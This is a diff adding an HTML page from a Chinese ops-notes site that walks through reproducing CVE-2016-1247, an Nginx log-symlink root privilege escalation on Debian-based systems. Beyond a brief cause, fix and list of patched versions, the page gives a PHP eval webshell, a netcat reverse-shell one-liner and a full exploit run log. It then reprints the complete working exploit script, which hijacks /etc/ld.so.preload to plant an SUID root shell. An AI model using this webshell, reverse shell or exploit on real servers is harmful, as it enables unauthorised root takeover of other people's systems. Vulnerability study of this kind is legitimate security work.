@@ -1,0 +1,444 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>（CVE-2016-1247）Nginx 提权漏洞｜安全与堡垒机 / 安全运维｜BEN.OPS</title>
+  <meta name="description" content="（CVE-2016-1247）Nginx 提权漏洞。本文属于安全与堡垒机 / 安全运维，漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 Debian: Fixed in Nginx 1.6.2…">
+  <meta name="keywords" content="安全与堡垒机，安全运维，CVE，Docker，Nginx，PHP，恶意代码，漏洞，安全与堡垒机 / 安全运维，（CVE-2016-1247）Nginx 提权漏洞">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%2BCVE%2BDocker-%EF%BC%88CVE-2016-1247%EF%BC%89Nginx%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="（CVE-2016-1247）Nginx 提权漏洞">
+  <meta property="og:description" content="（CVE-2016-1247）Nginx 提权漏洞。本文属于安全与堡垒机 / 安全运维，漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 Debian: Fixed in Nginx 1.6.2…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html">
+  <meta property="article:published_time" content="2023-04-14T15:57:00">
+  <meta property="article:modified_time" content="2023-04-14 15:57">
+  <meta property="article:section" content="安全与堡垒机 / 安全运维">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="（CVE-2016-1247）Nginx 提权漏洞">
+  <meta name="twitter:description" content="（CVE-2016-1247）Nginx 提权漏洞。本文属于安全与堡垒机 / 安全运维，漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 Debian: Fixed in Nginx 1.6.2…">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html#article","headline":"（CVE-2016-1247）Nginx 提权漏洞","description":"（CVE-2016-1247）Nginx 提权漏洞。本文属于安全与堡垒机 / 安全运维，漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 Debian: Fixed in Nginx 1.6.2…","datePublished":"2023-04-14T15:57:00","dateModified":"2023-04-14 15:57","inLanguage":"zh-CN","articleSection":["安全与堡垒机","安全运维"],"keywords":["安全与堡垒机","安全运维","CVE","Docker","Nginx","PHP","恶意代码","漏洞","安全与堡垒机 / 安全运维","（CVE-2016-1247）Nginx 提权漏洞"],"wordCount":1962,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"安全与堡垒机 / 安全运维","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"（CVE-2016-1247）Nginx 提权漏洞","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>安全与堡垒机 / 安全运维</span> › <span>（CVE-2016-1247）Nginx 提权漏洞</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">安全与堡垒机 / 安全运维</div>
+      <h1>（CVE-2016-1247）Nginx 提权漏洞</h1>
+      <p class="lede">（CVE-2016-1247）Nginx 提权漏洞。本文属于安全与堡垒机 / 安全运维，漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 Debian: Fixed in Nginx 1.6.2…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T15:57:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">1,962 字</span>
+        <span class="badge">6 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="一-漏洞简介">一、漏洞简介</h2>
+<p>漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。</p>
+<h2 id="二-漏洞影响">二、漏洞影响</h2>
+<p>Debian: Fixed in Nginx 1.6.2-5+deb8u3</p>
+<p>Ubuntu:</p>
+<p>Fixed in the following updated Nginx package versions on Ubuntu:</p>
+<p>Ubuntu 16.04 LTS: 1.10.0-0ubuntu0.16.04.3</p>
+<p>Ubuntu 14.04 LTS: 1.4.6-1ubuntu3.6</p>
+<p>Ubuntu 16.10: 1.10.1-0ubuntu1.1</p>
+<h2 id="三-复现过程">三、复现过程</h2>
+<pre><code class="language-bash">docker run -d -i --name CVE-2016-1247 -p 80:80 xk0n/cve-2016-1247
+</code></pre>
+<p>在容器里配置了 nginx + php 的环境，并有一个一句话木马 <code>/var/www/backdoor.php</code></p>
+<pre><code>&lt;?php
+@eval($_POST[c]);
+?&gt;
+</code></pre>
+<p>可以用<a href="https://github.com/antoor/antSword" rel="noopener noreferrer">antSword</a>连接测试，用下面的语句可以反弹回一个shell</p>
+<pre><code>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &lt;target IP&gt; &lt;port&gt; &gt;/tmp/bd
+</code></pre>
+<p>测试时发现gcc编译出错，可以在本地编译一个后上传。poc运行后会等待 logrotate 此时可以用下面的命令，人工触发条件。</p>
+<pre><code>/usr/sbin/logrotate -vf /etc/logrotate.d/nginx
+</code></pre>
+<p>测试记录如下：</p>
+<pre><code class="language-python">$ bash ./cve-2016-1247-poc.sh /var/log/nginx/error.log
+ _______________________________
+&lt; Is your server (N)jinxed ? ;o &gt;
+ -------------------------------
+ \
+ \  __---__
+ _- /--______
+ __--( / \ )XXXXXXXXXXX\v.
+ .-XXX( O O )XXXXXXXXXXXXXXX-
+ /XXX( U ) XXXXXXX\
+ /XXXXX( )--_ XXXXXXXXXXX\
+ /XXXXX/ ( O ) XXXXXX \XXXXX\
+ XXXXX/ / XXXXXX \__ \XXXXX
+ XXXXXX__/ XXXXXX \__----&gt;
+ ---___ XXX__/ XXXXXX \__ /
+ \- --__/ ___/\  XXXXXX / ___--/=
+ \-\  ___/ XXXXXX '--- XXXXXX
+ \-\/XXX\ XXXXXX /XXXXX
+ \XXXXXXXXX \  /XXXXX/
+ \XXXXXX &gt; _/XXXXX/
+ \XXXXX--__/ __-- XXXX/
+ -XXXXXXXX--------------- XXXXXX-
+ \XXXXXXXXXXXXXXXXXXXXXXXXXX/
+ ""VXXXXXXXXXXXXXXXXXXV""
+
+Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)
+nginxed-root.sh (ver. 1.0)
+
+Discovered and coded by:
+
+Dawid Golunski
+https://legalhackers.com
+
+[+] Starting the exploit as:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] Backdoor/low-priv shell installed at:
+-rwxr-xr-x 1 www-data www-data 1021112 Nov 19 13:44 /tmp/nginxrootsh
+
+[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at:
+lrwxrwxrwx 1 www-data www-data 18 Nov 19 13:44 /var/log/nginx/error.log -&gt; /etc/ld.so.preload
+
+[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
+[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges:
+-rw-r--r-- 1 www-data root 19 Nov 19 13:45 /etc/ld.so.preload
+
+[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload
+
+[+] The /etc/ld.so.preload file now contains:
+/tmp/privesclib.so
+
+[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
+-rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh
+
+[+] Rootshell got assigned root SUID perms at:
+-rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh
+
+The server is (N)jinxed ! ;) Got root via Nginx!
+
+[+] Spawning the rootshell /tmp/nginxrootsh now!
+
+nginxrootsh: cannot set terminal process group (1156): Inappropriate ioctl for device
+nginxrootsh: no job control in this shell
+nginxrootsh-4.3# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+nginxrootsh-4.3# whoami
+whoami
+root
+nginxrootsh-4.3# whoami
+whoami
+root
+</code></pre>
+<h3 id="poc">poc</h3>
+<pre><code class="language-bash">#!/bin/bash
+#
+# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit
+# nginxed-root.sh (ver. 1.0)
+#
+# CVE-2016-1247
+#
+# Discovered and coded by:
+#
+# Dawid Golunski
+# dawid[at]legalhackers.com
+#
+# https://legalhackers.com
+#
+# Follow https://twitter.com/dawid_golunski for updates on this advisory.
+#
+# ---
+# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu
+# etc.) to escalate their privileges from nginx web server user (www-data) to root
+# through unsafe error log handling.
+#
+# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
+# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
+# script which is called daily by the cron.daily on default installations.
+# The restart should take place at 6:25am which is when cron.daily executes.
+# Attackers can therefore get a root shell automatically in 24h at most without any admin
+# interaction just by letting the exploit run till 6:25am assuming that daily logrotation
+# has been configured.
+#
+#
+# Exploit usage:
+# ./nginxed-root.sh path_to_nginx_error.log
+#
+# To trigger logrotation for testing the exploit, you can run the following command:
+#
+# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
+#
+# See the full advisory for details at:
+# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+#
+# Video PoC:
+# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+#
+#
+# Disclaimer:
+# For testing purposes only. Do no harm.
+#
+BACKDOORSH="/bin/bash"
+BACKDOORPATH="/tmp/nginxrootsh"
+PRIVESCLIB="/tmp/privesclib.so"
+PRIVESCSRC="/tmp/privesclib.c"
+SUIDBIN="/usr/bin/sudo"
+function cleanexit {
+ # Cleanup
+ echo -e "\n[+] Cleaning up..."
+ rm -f $PRIVESCSRC
+ rm -f $PRIVESCLIB
+ rm -f $ERRORLOG
+ touch $ERRORLOG
+ if [ -f /etc/ld.so.preload ]; then
+ echo -n &gt; /etc/ld.so.preload
+ fi
+ echo -e "\n[+] Job done. Exiting with code $1 \n"
+ exit $1
+}
+function ctrl_c() {
+ echo -e "\n[+] Ctrl+C pressed"
+ cleanexit 0
+}
+#intro
+
+cat &lt;&lt;_eascii_
+ _______________________________
+&lt; Is your server (N)jinxed ? ;o &gt;
+ -------------------------------
+           \
+            \          __---__
+                    _-       /--______
+               __--( /     \ )XXXXXXXXXXX\v.
+             .-XXX(   O   O  )XXXXXXXXXXXXXXX-
+            /XXX(       U     )        XXXXXXX\
+          /XXXXX(              )--_  XXXXXXXXXXX\
+         /XXXXX/ (      O     )   XXXXXX   \XXXXX\
+         XXXXX/   /            XXXXXX   \__ \XXXXX
+         XXXXXX__/          XXXXXX         \__----&gt;
+ ---___  XXX__/          XXXXXX      \__         /
+   \-  --__/   ___/\  XXXXXX            /  ___--/=
+    \-\    ___/    XXXXXX              '--- XXXXXX
+       \-\/XXX\ XXXXXX                      /XXXXX
+         \XXXXXXXXX   \                    /XXXXX/
+          \XXXXXX      &gt;                 _/XXXXX/
+            \XXXXX--__/              __-- XXXX/
+             -XXXXXXXX---------------  XXXXXX-
+                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
+                  ""VXXXXXXXXXXXXXXXXXXV""
+_eascii_
+echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
+echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"
+# Args
+if [ $# -lt 1 ]; then
+ echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
+ echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
+ exit 3
+fi
+# Priv check
+echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
+id | grep -q www-data
+if [ $? -ne 0 ]; then
+ echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
+ exit 3
+fi
+# Set target paths
+ERRORLOG="$1"
+if [ ! -f $ERRORLOG ]; then
+ echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
+ exit 3
+fi
+# [ Exploitation ]
+trap ctrl_c INT
+# Compile privesc preload library
+# echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
+# cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC
+# #define _GNU_SOURCE
+# #include &lt;stdio.h&gt;
+# #include &lt;sys/stat.h&gt;
+# #include &lt;unistd.h&gt;
+# #include &lt;dlfcn.h&gt;
+#        #include &lt;sys/types.h&gt;
+#        #include &lt;sys/stat.h&gt;
+#        #include &lt;fcntl.h&gt;
+# uid_t geteuid(void) {
+#     static uid_t  (*old_geteuid)();
+#     old_geteuid = dlsym(RTLD_NEXT, "geteuid");
+#     if ( old_geteuid() == 0 ) {
+#         chown("$BACKDOORPATH", 0, 0);
+#         chmod("$BACKDOORPATH", 04777);
+#         unlink("/etc/ld.so.preload");
+#     }
+#     return old_geteuid();
+# }
+# _solibeof_
+# /bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
+# if [ $? -ne 0 ]; then
+#     echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
+#     cleanexit 2;
+# fi
+# Prepare backdoor shell
+cp $BACKDOORSH $BACKDOORPATH
+echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"
+# Safety check
+if [ -f /etc/ld.so.preload ]; then
+ echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
+ exit 2
+fi
+# Symlink the log file
+rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG
+if [ $? -ne 0 ]; then
+ echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
+ cleanexit 3
+fi
+echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"
+# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
+curl http://localhost/ &gt;/dev/null 2&gt;/dev/null
+# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily
+# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
+echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
+while :; do
+ sleep 1
+ if [ -f /etc/ld.so.preload ]; then
+ echo $PRIVESCLIB &gt; /etc/ld.so.preload
+ rm -f $ERRORLOG
+ break;
+ fi
+done
+# /etc/ld.so.preload should be owned by www-data user at this point
+# Inject the privesc.so shared library to escalate privileges
+echo $PRIVESCLIB &gt; /etc/ld.so.preload
+echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
+echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
+echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
+chmod 755 /etc/ld.so.preload
+
+# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
+echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
+sudo 2&gt;/dev/null &gt;/dev/null
+
+# Check for the rootshell
+ls -l $BACKDOORPATH
+ls -l $BACKDOORPATH | grep rws | grep -q root
+if [ $? -eq 0 ]; then
+ echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
+ echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
+else
+ echo -e "\n[!] Failed to get root"
+ cleanexit 2
+fi
+
+rm -f $ERRORLOG
+echo &gt; $ERRORLOG
+# Use the rootshell to perform cleanup that requires root privilges
+$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
+# Reset the logging to error.log
+$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"
+# Execute the rootshell
+echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
+$BACKDOORPATH -p -i
+
+# Job done.
+cleanexit 0
+</code></pre>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#一-漏洞简介">一、漏洞简介</a></li><li style="margin-left:0.0rem"><a href="#二-漏洞影响">二、漏洞影响</a></li><li style="margin-left:0.0rem"><a href="#三-复现过程">三、复现过程</a></li><li style="margin-left:0.8rem"><a href="#poc">poc</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：安全与堡垒机 / 安全运维</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">安全与堡垒机</span><span class="tag">安全运维</span><span class="tag">CVE</span><span class="tag">Docker</span><span class="tag">Nginx</span><span class="tag">PHP</span><span class="tag">恶意代码</span><span class="tag">漏洞</span></li>
+          <li><span>来源：03-安全运营与应急/07-工作运维离线知识库/04-安全运维/birdben/84422221.html</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%2BCVE%2BDocker-%EF%BC%88CVE-2016-1247%EF%BC%89Nginx%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>（CVE-2016-1247）Nginx 提权漏洞。本文属于安全与堡垒机 / 安全运维，漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。 Debian: Fixed in Nginx 1.6.2…</p>
+      <p>关键词：安全与堡垒机、安全运维、CVE、Docker、Nginx、PHP、恶意代码、漏洞、安全与堡垒机 / 安全运维、（CVE-2016-1247）Nginx 提权漏洞</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-97790b42c0b2.html"><small>上一篇</small>（CVE-2013-4547）Nginx URI Processing 安全绕过漏洞</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-c28c2100f7a4.html"><small>下一篇</small>（CVE-2017-7529）Nginx 越界读取缓存漏洞</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-27c1d3095655.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
